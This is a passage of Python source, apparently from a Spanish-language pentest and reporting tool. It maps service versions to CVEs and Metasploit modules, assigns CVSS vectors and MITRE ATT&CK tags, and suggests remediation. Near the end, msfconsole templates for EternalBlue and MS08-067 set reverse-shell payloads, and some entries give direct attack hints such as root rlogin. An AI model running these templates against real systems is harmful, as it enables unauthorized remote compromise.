    # Spring
    (r'spring framework|spring-webmvc',  None,  'critical', 'CVE-2022-22965', 'Spring4Shell RCE | exploit/multi/http/spring_framework_rce_spring4shell'),
    # ProxyLogon
    (r'microsoft exchange server 201[56]',None, 'critical', 'CVE-2021-26855', 'ProxyLogon SSRF + RCE | exploit/windows/http/exchange_proxylogon_rce'),
    # Nginx
    (r'nginx[/ ](1\.[01]\d\.|0\.)',        None, 'medium',  'CVE-2013-2028', 'nginx antiguo — revisar buffer overflow y misconfigs'),
    (r'nginx[/ ]1\.18\.',                  None, 'medium',  '',              'nginx 1.18 — posible alias traversal si configuración incorrecta'),
    # OpenSSH user enumeration
    (r'openssh[_ ](7\.[01234567]|6\.|5\.)',22,  'medium',  'CVE-2016-6210', 'OpenSSH User Enumeration via timing — auxiliary/scanner/ssh/ssh_enumusers'),
    # Apache Struts 2
    (r'struts[/ ]2\.(3\.[5-9]|3\.1[0-5])',None, 'critical','CVE-2017-5638', 'Apache Struts 2 OGNL Injection RCE (Jakarta Multipart) | exploit/multi/http/struts2_content_type_ognl'),
    (r'struts[/ ]2\.(5\.[1-9]|5\.1[0-9]|6\.)',None,'critical','CVE-2018-11776','Apache Struts 2 OGNL RCE | exploit/multi/http/struts_code_exec_classloader'),
    # Jenkins
    (r'jenkins[/ ](1\.|2\.[0-9]\.|2\.1[0-9]\.|2\.2[0-9]\.)',None,'critical','CVE-2019-1003000','Jenkins RCE via Groovy Script — exploit/multi/http/jenkins_script_console'),
    # Weblogic
    (r'weblogic[/ ](10\.|11\.|12\.)',      None, 'critical','CVE-2019-2725', 'Oracle WebLogic RCE | exploit/multi/http/oracle_weblogic_wsat_deserialization_rce'),
    # Windows RDP BlueKeep
    (r'microsoft.*rdp|ms-wbt-server',      3389, 'critical','CVE-2019-0708', 'BlueKeep candidato — exploit/windows/rdp/cve_2019_0708_bluekeep_rce'),
    # Log4j (detected via HTTP server headers or version strings)
    (r'log4j[- ](1\.|2\.[0-9]\.|2\.1[0-5]\.)',None,'critical','CVE-2021-44228','Log4Shell RCE — JNDI injection in all inputs'),
    # GitLab
    (r'gitlab[/ ]([789]\.|1[0-2]\.)',      None, 'critical','CVE-2021-22205','GitLab Unauthenticated RCE via image upload | exploit/multi/http/gitlab_exiftool_rce'),
    # Roundcube
    (r'roundcube[/ ]1\.[0-4]\.',           None, 'high',    'CVE-2020-12641','Roundcube RCE via server-side request'),
    # phpMyAdmin
    (r'phpmyadmin[/ ](3\.|4\.[0-7]\.|4\.8\.[0-3])',None,'high','CVE-2018-12613','phpMyAdmin LFI — posible RCE via /index.php?target='),
    # ColdFusion
    (r'coldfusion[/ ](10|11|2016|2018)',   None, 'critical','CVE-2018-15961','Adobe ColdFusion RCE via file upload | exploit/multi/http/coldfusion_fckeditor'),
    # Node.js / Express
    (r'node\.js[/ ](0\.|4\.|6\.|8\.|9\.|10\.|11\.)',None,'medium','','Node.js versión antigua — revisar prototype pollution, path traversal'),
    # Windows OS triggers (más completos)
    (r'windows.*2000|windows.*xp|windows.*2003',445,'critical','CVE-2008-4250','MS08-067 candidato (WinXP/2003) | exploit/windows/smb/ms08_067_netapi'),
    (r'windows.*(server 2012|windows 8)',  445, 'high',     'CVE-2020-0796', 'SMBGhost candidato — exploit/windows/smb/cve_2020_0796_smbghost'),
    # ProFTPD
    (r'proftpd 1\.3\.5',                   21,  'critical', 'CVE-2015-3306', 'ProFTPD 1.3.5 mod_copy SITE CPFR/CPTO RCE sin auth | exploit/unix/ftp/proftpd_modcopy_exec'),
    (r'proftpd 1\.3\.[01]',                21,  'critical', 'CVE-2010-4221', 'ProFTPD 1.3.0-1.3.1 buffer overflow | exploit/freebsd/ftp/proftp_telnet_iac'),
    # rlogin / rexec / rsh (Berkeley R-services)
    (r'rlogin|rsh\b',                       513, 'critical', '',              'rlogin sin auth — acceso root trivial via "rlogin -l root TARGET"'),
    (r'rexec\b',                            512, 'critical', '',              'rexec sin auth | auxiliary/scanner/rservices/rexec_login'),
    (r'shell\b|rsh\b',                      514, 'critical', '',              'rsh sin auth — ejecución remota sin contraseña'),
    # Webmin versiones con backdoor / RCE conocidas
    (r'webmin[/ ]1\.88[0-5]',              None,'critical', 'CVE-2019-15107','Webmin 1.880-1.885 RCE sin auth (backdoor) | exploit/linux/http/webmin_backdoor'),
    (r'webmin[/ ]1\.(2|3|4|5|6|7)\.',     None,'high',     'CVE-2012-2982', 'Webmin RCE con auth | exploit/unix/webapp/webmin_show_cgi_exec'),
    # Elasticsearch sin auth + versiones viejas
    (r'elasticsearch[/ ]1\.',              9200,'critical', 'CVE-2014-3120', 'Elasticsearch 1.x RCE via dynamic script execution'),
    (r'elasticsearch[/ ]2\.',              9200,'high',     '',              'Elasticsearch 2.x sin auth — acceso total a todos los índices'),
    # CouchDB
    (r'couchdb[/ ](1\.|2\.[01])',          5984,'critical', 'CVE-2017-12635','CouchDB Admin Party o privesc | exploit/linux/http/apache_couchdb_rce'),
    # Hadoop YARN
    (r'hadoop|yarn.*resourcemanager',      8088,'critical', '',              'Hadoop YARN ResourceManager RCE sin auth — REST API job submission'),
    # NFS
    (r'nfs|mountd',                        2049,'high',     '',              'NFS expuesto — verificar exports con no_root_squash para SUID'),
    # OpenSSH versiones con vulns específicas
    (r'openssh[_ ]7\.2p2',                 22,  'medium',   'CVE-2016-6210', 'OpenSSH 7.2p2 user enumeration + posible username bypass'),
    (r'openssh[_ ](2\.|3\.|4\.|5\.)',      22,  'high',     '',              'OpenSSH antiguo — revisar user enum y integer overflow CVEs'),
    # Tomcat versiones con PUT upload RCE
    (r'apache.tomcat[/ ]7\.',              None,'high',     'CVE-2017-12617','Tomcat 7 PUT method enabled — posible JSP upload | exploit/multi/http/tomcat_jsp_upload_bypass'),
    # Apache Tomcat RCE via DefaultServlet WRITE
    (r'apache.tomcat[/ ]9\.(0\.[0-9]\.|0\.[1-3][0-9]\.)',None,'high','CVE-2019-0232','Tomcat 9.0 CGI Servlet enableCmdLineArguments RCE'),
    # Jenkins (versiones viejas sin auth)
    (r'jenkins[/ ]2\.(0|[1-9]\.|[1-9][0-9]\.)',None,'critical','CVE-2018-1000861','Jenkins RCE via Groovy Script Console (sin auth en versiones viejas)'),
    # phpMyAdmin más versiones
    (r'phpmyadmin[/ ]4\.8\.[0-7]',        None,'critical', 'CVE-2018-12613','phpMyAdmin 4.8 LFI → RCE via session file include'),
    # WildFly / JBoss más versiones
    (r'wildfly|jboss.*eap',               None,'high',     'CVE-2015-7501', 'JBoss/WildFly Java Deserialization RCE | exploit/multi/http/jboss_deserialization'),
    # Shellshock via HTTP
    (r'bash.*4\.[0-3]\.',                 None,'critical', 'CVE-2014-6271', 'Bash 4.x — Shellshock via CGI headers'),
    # Node.js path traversal
    (r'node\.js[/ ](12|14|16)\.',         None,'low',      '',              'Node.js — verificar prototype pollution y dependencias con CVEs'),
    # Solr RCE
    (r'apache solr[/ ](5\.|6\.|7\.[0-5])',None,'critical', 'CVE-2019-0193', 'Apache Solr DataImportHandler RCE | exploit/multi/http/solr_velocity_rce'),
    # Portmap / RPC
    (r'rpcbind|portmap',                  111, 'medium',   '',              'RPC portmapper expuesto — enumerar servicios RPC (nfs, nlockmgr, etc.)'),
    # Finger daemon
    (r'\bfingerd?\b',                      79,  'low',      '',              'Finger daemon — enumeración de usuarios del sistema'),
    # IPMI
    (r'ipmi|baseboard management',        623, 'critical',  'CVE-2013-4786','IPMI 2.0 RAKP auth bypass — hash dump sin credenciales | auxiliary/scanner/ipmi/ipmi_dumphashes'),
    # VNC sin auth
    (r'vnc.*authentication.*none|rfb.*0\.0',5900,'critical','',             'VNC sin autenticación — acceso directo al escritorio'),
    # X11
    (r'\bx11\b|xorg|x\.org',              6000,'critical',  '',             'X11 expuesto — posible captura de pantalla y keylogging via xwd/xinput'),
]

# ── CVSS v3.1 auto-vector assignment ──────────────────────────────────────────
# (vector_str, base_score) pairs — score pre-calculated with NVD calculator
_CVSS_RULES = [
    # Critical — network RCE without auth, scope change
    (r'eternalblue|ms17-010|bluekeep|cve-2019-0708|doublePulsar|eternalromance',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 10.0),
    # Critical — network RCE without auth, no scope change
    (r'rce.*confirm|exploit.*confirm|log4shell|spring4shell|shellshock|vsftpd.*backdoor|'
     r'unrealircd.*backdoor|samba.*usermap|distcc.*rce|ms08-067|webmin.*backdoor|'
     r'drupalgeddon|struts.*ognl|redis.*rce|jenkins.*rce',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 9.8),
    # Critical — default credentials giving full access
    (r'default.*cred.*valid|cred.*default.*confirm|tomcat.*creds.*valid|phpmyadmin.*creds|'
     r'winrm.*confirm|pwn3d',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 9.8),
    # High — SQLi
    (r'sql.*inject|sqli|sqlmap.*confirm',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', 9.1),
    # High — RCE with auth (low priv)
    (r'rce.*auth|authenticated.*rce|groovy.*script.*exec|war.*upload.*rce|webshell',
     'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 8.8),
    # High — NTLM hash dump / secretsdump
    (r'ntlm.*hash|secretsdump|hashes.*volcad|administrator.*500.*[a-f0-9]{32}',
     'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N', 7.5),
    # High — privilege escalation to root
    (r'root.*obtenid|privesc.*confirm|sudo.*nopasswd.*escal|suid.*exploit|uid=0',
     'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 7.8),
    # High — LFI / path traversal with file read
    (r'lfi.*confirm|local.*file.*inclus|path.*travers.*confirm|etc/passwd.*le[íi]do',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 7.5),
    # High — Kerberoasting / AS-REP
    (r'kerberoast|as-rep.*roast|spn.*hash|krb5',
     'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N', 7.5),
    # High — sensitive file exposed (.env, secrets)
    (r'\.env.*expos|secret.*expos|api.*key.*expos|aws.*key.*expos|hardcoded.*secret|'
     r'js.*secret|js.*api.*key',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 7.5),
    # High — .git exposed
    (r'git.*expos|directorio.*git',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N', 7.3),
    # Medium — SMB signing disabled (relay attack precondition)
    (r'smb.*sign.*desab|smb.*signing.*disabled|signing.*false',
     'CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N', 6.8),
    # Medium — FTP anonymous
    (r'ftp.*an[oó]nim|anonymous.*ftp',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N', 6.5),
    # Medium — Stored XSS
    (r'xss.*stored|stored.*xss|cross.*site.*scripting.*stored',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 6.1),
    # Low — Reflected XSS / generic XSS
    (r'xss|cross.*site.*script',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 6.1),
    # Info — Open port / version detected (no vuln confirmed)
    (r'version.*detect|port.*open|service.*detect',
     'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N', 0.0),
]

_CVSS_SEV_FALLBACK = {
    'critical': ('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 9.8),
    'high':     ('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 7.5),
    'medium':   ('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N', 6.5),
    'low':      ('CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N', 3.3),
    'info':     ('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N', 0.0),
}

def _auto_cvss_vector(finding):
    """Return (vector_str, score) for a finding. Does not modify the finding in place."""
    if finding.get('cvss_vector', '').startswith('CVSS:'):
        return finding['cvss_vector'], finding.get('cvss')
    title = (finding.get('title') or '').lower()
    for pattern, vector, score in _CVSS_RULES:
        if re.search(pattern, title, re.IGNORECASE):
            return vector, score
    sev = (finding.get('severity') or 'info').lower()
    return _CVSS_SEV_FALLBACK.get(sev, _CVSS_SEV_FALLBACK['info'])

def _enrich_finding_cvss(finding):
    """Attach cvss_vector and cvss score to finding dict if not already set."""
    vector, score = _auto_cvss_vector(finding)
    if not finding.get('cvss_vector'):
        finding['cvss_vector'] = vector
    if finding.get('cvss') is None:
        finding['cvss'] = score
    return finding

def _match_version_cve(port_info, rhost):
    """Return a finding if the port's service/version matches a known vulnerable version."""
    port_num = int(port_info.get("port", 0))
    ver_str = f"{port_info.get('service', '')} {port_info.get('version', '')}".lower()
    if not ver_str.strip():
        return None
    for pattern, port_hint, sev, cve, desc in VERSION_CVE_MAP:
        if port_hint is not None and port_hint != port_num:
            continue
        if re.search(pattern, ver_str, re.IGNORECASE):
            svc_label = f"{port_info.get('service','')} {port_info.get('version','')}".strip()
            return {
                "id": str(uuid.uuid4()),
                "title": f"[Version] {svc_label} — Vulnerable",
                "severity": sev, "status": "open",
                "cve": cve, "cvss": None,
                "description": desc,
                "evidence": f"{port_num}/{port_info.get('proto','tcp')} {ver_str.strip()}",
                "hosts": [rhost] if rhost else [],
                "source": "version-detect",
            }
    return None

# ── MITRE ATT&CK auto-mapping table ──────────────────────────────────────────
MITRE_ATTACK_MAP = [
    (r'kerberoast|kerberoasting|\$krb5tgs\$', 'T1558.003', 'Kerberoasting'),
    (r'AS-REP|asrep|krb5asrep|\$krb5asrep\$', 'T1558.004', 'AS-REP Roasting'),
    (r'DCSync|dcsync|drsuapi', 'T1003.006', 'DCSync'),
    (r'Pass.the.Hash|PTH|pth.*ntlm|impacket.*-hashes', 'T1550.002', 'Pass the Hash'),
    (r'Golden Ticket|golden_ticket', 'T1558.001', 'Golden Ticket'),
    (r'Silver Ticket|silver_ticket', 'T1558.002', 'Silver Ticket'),
    (r'BloodHound|bloodhound|SharpHound', 'T1069', 'Permission Groups Discovery'),
    (r'EternalBlue|MS17-010|ms17_010|CVE-2017-0143', 'T1210', 'Exploitation of Remote Services'),
    (r'SMB Relay|ntlmrelayx|relay.*smb|smb.*relay', 'T1557.001', 'LLMNR/NBT-NS Poisoning and SMB Relay'),
    (r'Responder|LLMNR|NBT-NS poison', 'T1557.001', 'LLMNR/NBT-NS Poisoning'),
    (r'PetitPotam|coerce.*auth|DFSCoerce|PrinterBug|SpoolSample', 'T1187', 'Forced Authentication'),
    (r'ADCS|certipy|ESC[1-8]|certificate.*template|CA.*vulnerable', 'T1649', 'Steal or Forge Authentication Certificates'),
    (r'secretsdump|SAM.*dump|NTDS\.dit|impacket.*secretsdump', 'T1003.002', 'Security Account Manager'),
    (r'Mimikatz|lsass.*dump|procdump.*lsass', 'T1003.001', 'LSASS Memory'),
    (r'SQL [Ii]njection|sqlmap|injectable.*param', 'T1190', 'Exploit Public-Facing Application'),
    (r'LFI|Local File Inclusion|path.*traversal|/etc/passwd.*read', 'T1083', 'File and Directory Discovery'),
    (r'RCE|Remote Code Execution|command.*execution.*confirm', 'T1059', 'Command and Scripting Interpreter'),
    (r'XSS|Cross.Site Scripting|dalfox.*found', 'T1059.007', 'JavaScript'),
    (r'SSRF|Server.Side Request Forgery', 'T1090', 'Proxy'),
    (r'JWT|JSON Web Token|eyJ[a-zA-Z0-9].*vulnerable', 'T1552.001', 'Credentials in Files'),
    (r'default cred|default password|admin:admin|TOMCAT_CREDS|JENKINS_CREDS', 'T1078.001', 'Default Accounts'),
    (r'brute.?force|password spray|Hydra|crackmapexec.*spray', 'T1110.003', 'Password Spraying'),
    (r'privesc|privilege escalation|SUID.*exploit|sudo.*NOPASSWD|GTFOBins', 'T1548', 'Abuse Elevation Control Mechanism'),
    (r'shadow.*cred|pyWhisker|msDS-KeyCredentialLink|certipy.*shadow', 'T1649', 'Steal or Forge Authentication Certificates'),
    (r'unconstrained.*delegation|TrustedForDelegation', 'T1558.001', 'Kerberos Delegation Abuse'),
    (r'RBCD|resource.based.*constrained|msDS-AllowedToActOnBehalfOfOtherIdentity', 'T1558', 'Steal or Forge Kerberos Tickets'),
    (r'NFS.*no_root_squash|nfs.*root.*squash', 'T1548', 'Abuse Elevation Control Mechanism'),
    (r'Redis.*RCE|redis.*no.?auth.*cron', 'T1059', 'Command and Scripting Interpreter'),
    (r'Shellshock|CVE-2014-6271', 'T1190', 'Exploit Public-Facing Application'),
    (r'Log4Shell|log4j.*jndi|CVE-2021-44228', 'T1190', 'Exploit Public-Facing Application'),
    (r'Heartbleed|CVE-2014-0160', 'T1557', 'Adversary-in-the-Middle'),
    (r'SMB.*signing.*disabled|smb.*signing.*not required', 'T1557.001', 'NTLM Relay'),
    (r'pivot|sshuttle|chisel|ligolo|proxychains', 'T1090.002', 'External Proxy'),
    (r'meterpreter|shell.*opened|reverse.*shell.*obtained', 'T1059', 'Command and Scripting Interpreter'),
    (r'Tomcat.*cred|tomcat.*manager.*valid', 'T1078', 'Valid Accounts'),
    (r'phpMyAdmin.*root|phpmyadmin.*webshell|SELECT.*INTO.*OUTFILE', 'T1505.003', 'Web Shell'),
    (r'GraphQL.*introspect|GRAPHQL_INTROSPECTION_ENABLED', 'T1595.002', 'Vulnerability Scanning'),
    (r'vsftpd.*backdoor|CVE.*vsftpd', 'T1190', 'Exploit Public-Facing Application'),
    (r'\.env.*exposed|APP_KEY=|DB_PASSWORD=', 'T1552.001', 'Credentials in Files'),
    (r'\.git.*exposed|git.*HEAD.*ref', 'T1213', 'Data from Information Repositories'),
    (r'ZeroLogon|CVE-2020-1472', 'T1210', 'Exploitation of Remote Services'),
    (r'GenericAll|WriteDACL|AddMember.*domain.admins|ForceChangePassword', 'T1484.001', 'Domain Policy Modification'),
    (r'Spring4Shell|CVE-2022-22965|SpringShell', 'T1190', 'Exploit Public-Facing Application'),
    (r'Drupalgeddon|CVE-2018-7600', 'T1190', 'Exploit Public-Facing Application'),
    (r'PrintNightmare|CVE-2021-1675|CVE-2021-34527', 'T1210', 'Exploitation of Remote Services'),
    (r'domain.*admin|Domain Admins.*member|DA.*obtained', 'T1078.002', 'Domain Accounts'),
    (r'open.*redirect|CRLF.*injection|host.*header.*inject', 'T1583', 'Acquire Infrastructure'),
    (r'subdomain.*takeover|CNAME.*dangling', 'T1584.001', 'Compromise Infrastructure: Domains'),
    (r'IDOR|insecure.*direct.*object|unauthorized.*access.*user.*id', 'T1078', 'Valid Accounts'),
]

def _auto_mitre_tag(finding):
    """Auto-tag a finding with MITRE ATT&CK technique if pattern matches."""
    text = f"{finding.get('title','')} {finding.get('description','')} {finding.get('evidence','')}".lower()
    for pattern, technique_id, technique_name in MITRE_ATTACK_MAP:
        if re.search(pattern, text, re.IGNORECASE):
            if not finding.get('mitre_technique'):
                finding['mitre_technique'] = technique_id
                finding['mitre_name'] = technique_name
            break
    return finding

# ── Auto-remediation database ──────────────────────────────────────────────────
_REMEDIATION_DB = [
    # Pattern (against title+description) → remediation text
    (r'ms17-010|eternalblue',
     "Aplicar parche MS17-010 de Microsoft (KB4012212). Deshabilitar SMBv1 via PowerShell: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`. Implementar segmentación de red para aislar sistemas Windows antiguos."),
    (r'ms08-067',
     "Aplicar parche MS08-067 (KB958644). Actualizar a Windows 7+ mínimo o aislar el sistema detrás de firewall con acceso SMB (445) bloqueado."),
    (r'bluekeep|cve-2019-0708',
     "Instalar parche KB4499175. Deshabilitar RDP si no es necesario o restringir acceso via VPN con MFA. Habilitar NLA (Network Level Authentication)."),
    (r'zerologon|cve-2020-1472',
     "Aplicar parche de agosto 2020 (KB4571694). Habilitar 'FullSecureChannelProtection' vía Group Policy. Monitorizar eventos 5827/5828/5829 en DC."),
    (r'printnightmare|cve-2021-1675|cve-2021-34527',
     "Deshabilitar Print Spooler si no es necesario: `Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled`. Instalar parche KB5004945."),
    (r'sql.injection|sqlmap|injectable',
     "Usar prepared statements / parameterized queries en todas las consultas SQL. Implementar WAF. Principio de mínimo privilegio para cuentas de BD. Validar y sanitizar todos los inputs de usuario."),
    (r'xss|cross.site.scripting',
     "Implementar Content-Security-Policy (CSP) estricta. Escapar todos los outputs HTML (htmlspecialchars). Usar HTTPOnly y Secure flags en cookies. Validar inputs en servidor."),
    (r'lfi|local file inclusion|path traversal',
     "Evitar usar input del usuario en rutas de archivo. Usar realpath() + validar que el path resultante esté dentro del directorio permitido. Deshabilitar allow_url_include en PHP. Implementar chroot."),
    (r'rce|remote code execution|command injection',
     "Nunca pasar input del usuario a funciones de ejecución de sistema (exec, system, shell_exec). Usar APIs del lenguaje en lugar de comandos shell. Implementar sandboxing y principio de mínimo privilegio."),
    (r'ssrf|server.side request forgery',
     "Implementar whitelist de URLs/IPs permitidas. Bloquear acceso a metadatos cloud (169.254.169.254) en firewall. No exponer respuestas de requests internos al cliente."),
    (r'xxe|xml external entity',
     "Deshabilitar procesamiento de entidades externas XML: `FEATURE_EXTERNAL_GENERAL_ENTITIES = False`. Usar JSON en lugar de XML donde sea posible. Actualizar librerías XML."),
    (r'ssti|template injection',
     "Nunca renderizar templates con input no confiable. Usar sandboxed template engines. Escapar variables de usuario antes de pasarlas a templates."),
    (r'jwt|json web token',
     "Usar algoritmos asimétricos (RS256/ES256). Validar el claim 'alg' en servidor. Usar secrets de alta entropía (256+ bits). Implementar token expiration corto (15 min) + refresh tokens. Usar librerías actualizadas."),
    (r'deserialization|insecure.*deserializ',
     "Nunca deserializar datos de fuentes no confiables. Implementar signature/HMAC de datos serializados. Usar formatos seguros (JSON/protobuf). Actualizar librerías de serialización."),
    (r'wordpress|wp-admin|wp-login',
     "Actualizar WordPress core, plugins y temas. Usar contraseñas fuertes y 2FA en wp-admin. Limitar intentos de login. Ocultar wp-login.php con obscurity. Principio de mínimo privilegio para usuarios."),
    (r'default.*cred|default.*password|admin:admin',
     "Cambiar inmediatamente credenciales por defecto. Implementar política de contraseñas fuertes. Usar un gestor de contraseñas. Auditar todas las credenciales del sistema."),
    (r'ssh.*root|permitrootlogin',
     "Deshabilitar login SSH como root: `PermitRootLogin no` en /etc/ssh/sshd_config. Usar usuarios con sudo. Implementar autenticación por clave SSH. Deshabilitar autenticación por contraseña."),
    (r'smb.*signing.*disabled|ntlm.*relay',
     "Habilitar SMB signing en todos los sistemas: GPO → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications'."),
    (r'kerberoast',
     "Usar contraseñas largas (25+ caracteres) para cuentas de servicio. Implementar gMSA (Group Managed Service Accounts). Detectar solicitudes de TGS inusuales en el SIEM."),
    (r'asrep|as.rep',
     "Habilitar Kerberos pre-authentication para todas las cuentas. Revisar cuentas con 'Do not require Kerberos preauthentication' activo."),
    (r'pass.the.hash|pth',
     "Implementar Credential Guard. Usar cuentas locales únicas por sistema (LAPS). Deshabilitar NTLMv1. Monitorizar autenticaciones NTLM inusuales."),
    (r'golden ticket|krbtgt',
     "Resetear la contraseña de krbtgt DOS VECES (con 10h de diferencia). Implementar PAC validation. Monitorizar tickets con vida útil >10h o sin PAC."),
    (r'ldap.*anon|ldap.*bind',
     "Deshabilitar LDAP anonymous bind. Usar LDAP over SSL (LDAPS). Auditar permisos del directorio activo."),
    (r'snmp.*community|snmp.*public|snmp.*private',
     "Cambiar community strings por defecto. Migrar a SNMPv3 con autenticación y cifrado. Restringir acceso SNMP por ACL al servidor de monitorización. Deshabilitar SNMP si no es necesario."),
    (r'redis.*no.?auth|redis.*unauthenticated',
     "Configurar `requirepass` en redis.conf. Bindear Redis solo a localhost o IP de confianza (bind 127.0.0.1). Deshabilitar comandos peligrosos (CONFIG, SLAVEOF, DEBUG)."),
    (r'mongodb.*no.?auth|mongodb.*unauthenticated',
     "Habilitar autenticación MongoDB: `security.authorization: enabled`. Bindear a localhost. Usar TLS. Crear usuarios con mínimo privilegio."),
    (r'memcached',
     "Bindear Memcached solo a interfaces internas. Implementar firewall para bloquear puerto 11211 desde exterior. Considerar migrar a Redis con autenticación."),
    (r'ftp.*anon|anonymous.*ftp',
     "Deshabilitar acceso FTP anónimo. Si se necesita, usar SFTP en su lugar. Auditar qué archivos son accesibles anónimamente."),
    (r'nfs.*no_root_squash',
     "Configurar `root_squash` en /etc/exports. Limitar exports a IPs específicas. Usar NFSv4 con Kerberos authentication. Revisar permisos de directorios exportados."),
    (r'docker.*group|docker.*escape',
     "No añadir usuarios al grupo docker innecesariamente. Usar rootless Docker. Implementar AppArmor/SELinux profiles para contenedores. Usar --no-new-privileges flag."),
    (r'sudo.*nopasswd|gtfobins',
     "Revisar y restringir entradas /etc/sudoers. Eliminar NOPASSWD excepto donde sea estrictamente necesario. Documentar y auditar todos los privilegios sudo."),
    (r'log4shell|cve-2021-44228|jndi.*inject',
     "Actualizar Log4j a 2.17.1+. Si no es posible, establecer `log4j2.formatMsgNoLookups=true` o `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. Implementar WAF con reglas Log4Shell."),
    (r'spring4shell|cve-2022-22965',
     "Actualizar Spring Framework a 5.3.18+ / 5.2.20+. Actualizar Tomcat a 9.0.62+ / 8.5.78+. Usar JDK 9+ con configuración restrictiva de ClassLoader."),
    (r'confluence.*ognl|cve-2022-26134',
     "Actualizar Confluence a versión parcheada (7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+). Si no es posible, implementar WAF o restringir acceso."),
    (r'exchange.*proxy|proxylogon|proxyshell|cve-2021-2685[5-9]',
     "Aplicar parches KB5001779 (ProxyLogon) y KB5001779 (ProxyShell). Actualizar Exchange a CU más reciente. Revisar reglas de redirección en OWA y PowerShell endpoints."),
    (r'cors.*misconfiguration|cors.*null|cors.*wildcard',
     "Configurar Access-Control-Allow-Origin con lista blanca explícita de dominios. Nunca reflejar el header Origin sin validación. No usar credenciales con Access-Control-Allow-Origin: *."),
    (r'file upload|unrestricted upload|webshell.*upload',
     "Validar extensión y MIME type en servidor. Almacenar uploads fuera del document root o en bucket S3 sin ejecución. Renombrar archivos subidos. Antivirus en uploads."),
    (r'cve-2021-41773|apache.*path.traversal|cve-2021-42013',
     "Actualizar Apache a 2.4.51+. Deshabilitar mod_cgi si no es necesario. Configurar 'Require all denied' como default en <Directory />."),
    (r'tomcat.*manager|war.*deploy',
     "Cambiar credenciales del Tomcat Manager. Restringir acceso por IP (RemoteAddrValve). Deshabilitar el Manager en producción si no se usa. Usar AJP con secret."),
    (r'gitlab.*rce|cve-2021-22205',
     "Actualizar GitLab a 13.10.3+. Auditar usuarios con acceso API. Implementar WAF con reglas para uploads de imágenes."),
    (r'f5.*big-ip|cve-2022-1388',
     "Aplicar hotfix de F5 para CVE-2022-1388. Bloquear acceso a /mgmt/ desde IPs no autorizadas. Deshabilitar TMUI si no se usa externamente."),
    (r'citrix.*netscaler|cve-2019-19781',
     "Aplicar parches de Citrix para CVE-2019-19781. Verificar si la instancia ha sido comprometida (indicadores de compromiso de Citrix). Resetear todas las credenciales si se sospecha compromiso."),
    (r'suid.*exploit|setuid|cap_setuid',
     "Auditar binarios con SUID: `find / -perm -4000 -type f`. Eliminar SUID de binarios no necesarios. Usar capabilities mínimas en lugar de SUID. Implementar AppArmor/SELinux."),
    (r'kernel.*exploit|dirtypipe|dirtycow|pwnkit',
     "Actualizar el kernel del sistema operativo. Implementar proceso regular de patching. Usar grsecurity/PaX donde sea posible. Considerar contenedores con capacidades reducidas."),
    (r'crontab.*writable|writable.*cron',
     "Asegurar que scripts ejecutados por cron no sean escribibles por usuarios no privilegiados. Auditar permisos: `ls -la /etc/cron*`. Usar AIDE para detectar modificaciones."),
]

def _auto_remediation(finding):
    """Attach remediation recommendation based on finding title+description."""
    if finding.get("remediation"):
        return finding
    text = f"{finding.get('title', '')} {finding.get('description', '')} {finding.get('cve', '')}".lower()
    for pattern, remediation in _REMEDIATION_DB:
        if re.search(pattern, text, re.IGNORECASE):
            finding["remediation"] = remediation
            break
    if not finding.get("remediation"):
        # Generic by severity
        sev = finding.get("severity", "info")
        finding["remediation"] = {
            "critical": "Aplicar parche del fabricante de forma inmediata. Aislar el sistema afectado hasta que sea parcheado. Revisar indicadores de compromiso.",
            "high":     "Planificar remediación en los próximos 7 días. Implementar controles compensatorios hasta que se pueda aplicar el parche.",
            "medium":   "Planificar remediación en los próximos 30 días. Evaluar el riesgo en contexto del entorno.",
            "low":      "Planificar remediación en el próximo ciclo de mantenimiento.",
            "info":     "Revisar y evaluar si esta configuración es apropiada para el entorno.",
        }.get(sev, "Revisar y aplicar las mejores prácticas del fabricante.")
    return finding

# ── MSF auto-command templates ─────────────────────────────────────────────
# pattern (against title+desc+cve) -> msfconsole command block template
_MSF_AUTO_CMDS = [
    (r'ms17-010|eternalblue|cve-2017-014[34]',
     "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'ms08-067|cve-2008-4250',
     "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS {rhost}\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
